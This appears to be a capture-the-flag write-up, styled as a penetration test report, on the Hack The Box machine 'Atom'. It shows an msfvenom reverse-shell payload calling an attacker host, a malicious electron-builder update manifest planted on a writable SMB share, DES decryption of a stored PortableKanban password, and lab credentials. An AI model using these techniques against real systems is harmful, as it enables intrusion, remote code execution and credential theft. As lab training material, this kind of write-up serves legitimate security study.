# Penetration Test Report — Atom

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-electron--builder%20RCE%20%2F%20Redis-red)

## Executive Summary

An authorized assessment of `target.htb` compromised an Electron-based application update pipeline. A guest-writable SMB share served as the update source, and a signature-validation flaw in `electron-builder` (bypassed via a single-quote filename) allowed a malicious update to execute, yielding a shell as user `jason`. Post-exploitation recovered Redis credentials from a configuration file, and a PortableKanban password stored in Redis was decrypted using its hardcoded DES key — revealing the Administrator password and full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Guest-writable SMB share used as software-update source | Critical |
| 2 | electron-builder signature-validation bypass → RCE | High |
| 3 | Redis credentials in readable configuration file | Medium |
| 4 | PortableKanban hardcoded DES key/IV → recoverable stored passwords | High |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC target.htb
```

Notable services: Apache (80), SMB (445), Redis (6379 — authentication required). The website advertised "Heed", a note-taking Electron app; the installed app showed an **auto-updater error**. SMB allowed guest access:

```bash
smbmap -u anonymous -p anonymous -H target.htb
smbmap -u anonymous -p anonymous -H target.htb -R Software_Updates
```

The `Software_Updates` share (read/write) held client folders and `UAT_Testing_Procedures.pdf`, describing that updates dropped there are installed by QA. Wireshark showed the app resolving `updates.atom.htb` and fetching `latest.yml` over HTTP.

### 2. Foothold — Malicious Update

`electron-builder` signature validation could be bypassed by embedding a single quote in the filename. A payload was built and its SHA-512 computed:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > shell.exe
sha512sum shell.exe | cut -d ' ' -f1 | xxd -r -p | base64 -w0
mv shell.exe "s'hell.exe"
```

`latest.yml` was crafted with a higher version and the quoted filename:

```yaml
version: 1.0.1
files:
- url: s'hell.exe
  sha512: <base64-sha512>
  size: 7168
path: s'hell.exe
sha512: <base64-sha512>
```

Both files were uploaded to a client folder in `Software_Updates`. On the next update check, the app executed the payload — reverse shell as `jason`.

### 3. Privilege Escalation — Redis → PortableKanban → Administrator

`jason`'s Downloads contained **PortableKanban**, which encrypts stored passwords with a hardcoded DES key/IV. The app supports Redis storage; the Redis configuration was readable:

```
C:\Program Files\Redis\redis.windows-service.conf → requirepass kidvscat_yes_kidvscat
```

Authenticating to Redis revealed user records with an `EncryptedPassword` field for Administrator, decrypted with the known DES key (`7ly6UznJ` / IV `XuVUm5fR`):

```python
import base64
from des import *
hash = base64.b64decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print(key.decrypt(hash, initial=b"XuVUm5fR", padding=True).decode('utf-8'))
# kidvscat_admin_@123
```

Password reuse over WinRM yielded the Administrator shell:

```bash
evil-winrm -i target.htb -u administrator -p kidvscat_admin_@123
```

## Remediation

- Remove guest write access from shares, especially any update distribution path.
- Pin/verify update channels (signed manifests, TLS, code-signing enforcement); patch electron-builder.
- Require authentication and network isolation for Redis; never store secrets in plaintext configs.
- Prohibit password storage schemes with hardcoded keys; enforce unique passwords (no reuse from service to admin).

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1195.002 — Supply Chain Compromise (software update) |
| Credential Access | T1552.001 — Credentials in Files |
| Credential Access | T1557 — adversary-in-the-middle–style update abuse |
| Privilege Escalation | T1078 — Valid Accounts |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
